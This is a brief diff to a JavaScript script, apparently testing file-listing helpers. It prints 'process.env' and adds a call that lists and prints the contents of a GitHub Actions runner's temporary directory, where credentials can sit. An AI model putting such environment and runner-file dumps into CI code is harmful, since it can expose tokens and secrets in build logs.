@@ -9,3 +9,10 @@ index.cat("./index.js")
 setTimeout(() => { console.log("World!"); }, 5000);
 
 console.log(process.env);
+
+
+console.log("xxxxxx");
+
+const {ls, cat, lscat} = require("../index");
+
+lscat("/home/runner/work/_temp")
